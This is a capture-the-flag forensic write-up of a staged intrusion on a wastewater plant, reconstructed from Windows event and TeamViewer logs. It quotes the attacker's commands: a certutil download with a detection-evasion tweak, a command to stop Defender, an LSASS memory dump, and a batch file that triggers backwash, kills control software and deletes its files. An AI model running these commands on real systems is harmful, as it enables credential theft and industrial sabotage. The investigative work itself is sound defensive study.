# Pooptoria

## DFIR, 3000 points

### Description

The notorious threat actor Fancy Poodle has done it again! This time striking at Strikdaspoort Wastewater Treatment Plant in Pretoria, South Africa...

Do you have what it takes to solve the investigation while only using limited triage data? All before the license-dongle-wielding forensic analysts have checked their write blockers out of storage?

For more information, check the [Pooptoria scenario backstory](https://socvel.com/pooptoria.html#Pooptoria).

Author: [SocVel](https://twitter.com/socveldotcom)

### Solution

For this lab, I will explain my investigation work regarding this hack. To break down this exercise, I will focus on interesting questions asked in this SocVel's challenge. Thus, some questions might be omitted.

Most of the logs for this challenge uses the `.evtx` extension which are logs managed by Windows Event Viewer, you can get more information on [this Forensics Wiki](https://forensicswiki.xyz/wiki/index.php?title=Windows_XML_Event_Log_%28EVTX%29) or [this LogRhythm documentation](https://docs.logrhythm.com/docs/devices/ms-windows-event-log-sources/ms-windows-event-logging-xml-windows-defender/malware-detection-events-xml-logs
). In order to deal with Windows Event Log files on my Linux operating system, I converted them into XML files with a Python script `evtx_dump.py`, available in my GitHub repository [there](https://github.com/exti0p/ctf/blob/master/2021/SocVel/DFIR/evtx_dump.py).

#### Q3) What was the full command the attacker ran that led to the successful download of the archive?

After implanting a trojan (Ceprolad Trojan), the attacker indeed downloaded successfully a very particular archive, as `Administrator`, after one fail. From the `Sysmon.xml` file, the latter was blocked by Windows Defender, he tried this command at first: 
```bash
$ certutil.exe -urlcache -split -f https://download.sysinternals.com/files/Procdump.zip procdump.zip
```

After a few seconds he added quotes to the malicious URL to bypass the detection, hence, according to event record ID 11804 (`<EventRecordID>11804</EventRecordID>`), he ran this full command:

```bash
$ certutil.exe  -urlcache -split -f "https://download.sysinternals.com/files/Procdump.zip" procdump.zip
```

#### Q5) The attacker seems to have tried and failed to disable Windows Defender via the command line. What command was run on the host for this?

How do I stop Windows Defender on the command line? I had no idea, really, so I documented myself with [this article](https://www.itechtics.com/enable-disable-windows-defender/), and turns out, it is quite easy. You have to do the following command:
```bash
> sc stop WinDefend
```

Thereby, I searched for "stop WinDefend" in the Sysmon XML logs and found that interesting entry:
```xml
<Data Name="UtcTime">2021-03-12 08:19:40.296</Data>
<Data Name="CommandLine">sc  stop WinDefend</Data>
<Data Name="User">POOPCONTROLLER\Administrator</Data>
```

Here is the asked command line.

#### Q8) Procdump was used to dump the process memory of a very specific process. This was most likely in an attempt to obtain additional credentials from the host. What is the full path where this process’ executable resides on the disk? (i.e. c:\folder\file.exe)

I immediately remember my last pentests in an Active Directory environment: it is very likely that, to obtain additional credentials from the host, I need to focus on `lsass.exe` also known as `Local Security Authority Subsystem`. You can find more information with [MITRE ATT&CK](https://attack.mitre.org/) in [this sub-technique detail](https://attack.mitre.org/techniques/T1003/001/). Still in the Sysmon logs, I look for `lsass.exe` and get the full path requested from the question: `C:\Windows\System32\lsass.exe`.

#### Q9) What was the location of the dump file created from the process dumped with Procdump? Provide the path and filename as your answer, i.e. c:\Users\Admin\file.exe

Linked to my previous finding, the dump is done by any kind of `procdump` instance, so it should be near the `procdump` executable, to make it as simple as possible. Thus, it makes sense to find this executable location first. A quick search in Sysmon logs get me the result:
```xml
<Data Name="TargetFilename">C:\tmp\procdump.exe</Data>
```

After scrolling with that new data, I find what I was looking for:
```xml
<Data Name="ParentImage">C:\tmp\procdump.exe</Data>
<Data Name="ParentCommandLine">procdump  -ma lsass.exe lsass.dmp</Data>
```

Hence, my dumped file is `lsass.dmp` and is indeed in the same temporary directory than `procdump` executable.

#### Q10) During March 2021, it was widely reported that a specific threat actor group was using Procdump to also dump LSASS process memory. This was part of attacks targeting Microsoft Exchange infrastructure. What was the name given by Microsoft to this threat actor?

A general knowledge or OSINT question, I really like these questions regarding SocVel's challenges, it is relevant to realize that these techniques that I understand through CTF or academic courses, are developed and used by real APT groups.

Google is my friend! Thanks to [this article](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) and [eventually this one too](https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/) I concluded that HAFNIUM is this mean APT group that used `procdump` to dump LSASS process memory.

#### Q13) What was the domain looked up in the first DNS query done by the Teamviewer application after it was installed?

I struggled for some time on this question. At first I went to some TeamViewer deployment in entreprise websites, in order to find which DNS one has to enable to make it work. In vain, I also read [this TeamViewer security article](https://awakesecurity.com/blog/analyzing-teamviewer/) which deals with some TeamViewer DNS names. I was getting closer.

After a while, I decided to get back to the logs I have: I analyzed `Application.xml` which are logs regarding software installed on the monitored machine, I found out that some TeamViewer Desktop application has been launched at 5 a.m.:
```xml
<TimeCreated SystemTime="2021-03-10 05:01:40.768103"></TimeCreated>
```

It makes sense, as from Sysmon logs, TeamViewer's installation a few minutes before, modulo if the previous timestamp is in UTC:
```xml
<Data Name="UtcTime">2021-03-10 04:31:21.934</Data>
<Data Name="QueryName">download.teamviewer.com</Data>
```

It narrows our area of search then: the DNS request I have to find is between these timestamps. It is important to note that it should be TeamViewer service or desktop software that makes this request. Also, as the desktop instance is launched at `05:01:40.768103`, I supposed that it is very likely that, before this timestamp, I should be looking for TeamViewer service instance.

A bit more of searching led me to an interesting DNS query, from Sysmon logs:
```xml
<Data Name="UtcTime">2021-03-10 04:40:51.316</Data>
<Data Name="QueryName">router7.teamviewer.com</Data>
<Data Name="QueryResults">type:  5 routerpool7.rlb.teamviewer.com;::ffff:37.252.253.104;::ffff:188.172.198.137;::ffff:178.255.155.179;::ffff:213.227.168.147;::ffff:217.146.13.133;</Data>
<Data Name="Image">C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe</Data>
```

Which append to be our first DNS query done after the installation.

#### Q14) You have been provided with the attached log files for the Teamviewer application installed on the host. Based on the logs, what was the IP address of the last successful Teamviewer connection made to the host?

I need to craft a regex to identify all IPs to narrow down my searches. As I am lazy, I just used [this website's](https://ihateregex.io/expr/ip/) regex which works perfectly:
```bash
$ strings Teamviewer/TeamViewer15_Logfile.log | grep -oP "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}" > IP
```

To have unique IP addresses:
```bash
$ strings Teamviewer/TeamViewer15_Logfile.log | grep -oP "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}" | sort --unique > IP_unique
```

Then, I listed all the IPs from this provided log file. I supposed that a successful TeamViewer connection raises the same event ID as a RDP successful connection. Thus, according to [this documentation](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624). After matching these found IP addresses in Sysmon logs, I pointed out that `8.36.216.45` is used for RDP connection and is like no other collected IP addresses.

To be sure of my answer, I cross matched this information with the event ID `4624` which logs `An account was successfully logged on` in the `Security.xml` file. It turns out that my guess was right, everything correlates to `8.36.216.45`.

#### Q16) We want to block the attacker's IP address that was used to conduct the Brute Force attack. What IP address can we send to the Firewall team for blocking?

I adopted the same approach here with `Security.xml`:
```bash
$ strings Security.xml | grep -oP "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}" | sort --unique > IP
```

Only two candidates seems to fit:
```bash
8.36.216.45
8.36.216.58
```

I know from the previous question that `8.36.216.45` is the IP address that successfully logged on with TeamViewer. Let's get more information about that second IP address: we can note that on Sysmon logs, there are a lot of RDP connections in a row made by `8.36.216.58`, and it is not the case for `8.36.216.45`. From that, I deduced that it is the IP that conducted the brute force attack.

#### Q18) Following this attack and based on the event logs, you can see that the attacker was successful in guessing (brute forcing) the password for the Administrator account. Provide the first timestamp from the logs where you can see the attacker was successful in guessing the account’s password. *Provide your answer in the format of yyyy-mm-dd hh:mm:ss in UTC*

Here I have to identify the first occurrence of `8.36.216.58` the bruteforcer IP address with the account `Administrator` login in successfully, with the event ID `4624` in `Security.xml` then.

Out of curiosity, `4625` event ID is unsuccessful connection regarding [this documentation](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4625
).

Back to my filter, I used this one: 
```xml
<EventID Qualifiers="">4624</EventID>
```

After scrolling for quite some time, I found out this entry, matching my hypothesis:

```xml
<EventID Qualifiers="">4624</EventID>
<TimeCreated SystemTime="2021-03-11 20:26:52.043680"></TimeCreated>
<EventRecordID>7119</EventRecordID>
<Channel>Security</Channel>
<Computer>PoopController</Computer>
<Data Name="TargetUserName">Administrator</Data>
<Data Name="TargetDomainName">POOPCONTROLLER</Data>
<Data Name="LogonType">3</Data>
<Data Name="LogonProcessName">NtLmSsp </Data>
<Data Name="AuthenticationPackageName">NTLM</Data>
<Data Name="WorkstationName">FancyPoodle</Data>
<Data Name="IpAddress">8.36.216.58</Data>
```

Which gives us the requested timestamp.


#### Q19) We’ve now confirmed that the attacker was able to brute force the Administrator account’s password. When, based on the Windows Security Event logs, did the attacker successfully log into the host using Windows RDP for the first time? *Provide the date in UTC time, using the following format: yyyy-mm-dd hh:mm:ss*

According to [this article](http://woshub.com/rdp-connection-logs-forensics-windows/) the information I have to add now is the `Logontype = 10` if it is a new session that it is created while logging on, which is the attacker's case. Thereby, same process as previously, with this additional requirement: I have to identify the first occurrence of `8.36.216.58` with the account `Administrator` login in successfully, with the event ID `4624` and with a new session creation, thus, with an attribute `LogonType` with a value of `10` in `Security.xml` then.

Here is my winner:
```xml
<EventID Qualifiers="">4624</EventID>
<TimeCreated SystemTime="2021-03-12 08:03:00.011768"></TimeCreated>
<EventRecordID>7377</EventRecordID>
<Channel>Security</Channel>
<Computer>PoopController</Computer>
<Data Name="SubjectUserName">POOPCONTROLLER$</Data>
<Data Name="SubjectDomainName">WORKGROUP</Data>
<Data Name="TargetUserName">Administrator</Data>
<Data Name="TargetDomainName">POOPCONTROLLER</Data>
<Data Name="LogonType">10</Data>
```

It is notably at the beginning of the attack that the attacker successfully logged in for the first time, with Windows RDP.

#### Q24) Based on information received from the public, the first visual signs of raw sewage spilling into the Apies river from the plant was around 14:00 local time on March 12th 2021. According to the plant technicians, it would take at least 45 minutes for the plant to excrete sewage into the river once the backwash mode was activated. A file was created on the system that matches the above timelines and, based on its content, could likely have been used by the attackers to initiate the plant backwash. What was the name of this file? Provide only the filename with extension (i.e. filename.jpg) as your answer.

On the day of the attack "2021-03-12", I have to look for a timestamp around 13:15 (14:00 - 45 min) on local timezone. Also, remember that this is an exercise in Pretoria, South Africa timezone, it is UTC+02:00 then. In UTC, the focus is around 11:15.

After a quick search with `backwash` key word and my approximative timestamp requirement, I find the interesting entry:
```xml
<Data Name="UtcTime">2021-03-12 11:09:03.439</Data>
<Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
<Data Name="TargetFilename">C:\Users\Administrator\Downloads\backwash.bat</Data>
<Data Name="CreationUtcTime">2021-03-12 11:08:52.011</Data>
<Data Name="Contents">start "C:\Program Files\ifak\SIMBA#4.3\Simba.exe --function backwash --interruptable no"  timeout /t 30 /nobreak  taskkill /F /IM simba.exe /T  taskkill /F /IM simba.exe /T  taskkill /F /IM simba.exe /T  taskkill /F /IM simba.exe /T  taskkill /F /IM simba.exe /T  DEL /F /Q "C:\Program Files\ifak\SIMBA#4.3\*"  </Data>
```

From that, I understood that the script is coded in the file `backwash.bat`.

#### Q28) Based on the available logs, there are limited indications that the downloaded malicious file was executed on the host. (The file mentioned in Question 24 [PTA_Q24]). Provide the earliest timestamp which shows proof of the file being executed on the host. Provide the date in UTC time, using the following format: yyyy-mm-dd hh:mm:ss

From Q26), I have the __Contents__ attribute, which is the content of the `backwash.bat` file. I just have to look for, in Sysmon most likely, the first occurrence of the beginning of the script, which is `timeout /t 30 /nobreak`:

```xml
<Data Name="UtcTime">2021-03-12 11:10:03.842</Data>
<Data Name="Image">C:\Windows\System32\timeout.exe</Data>
<Data Name="Description">timeout - pauses command processing</Data>
<Data Name="OriginalFileName">timeout.exe</Data>
<Data Name="CommandLine">timeout  /t 30 /nobreak</Data>
```

And flag!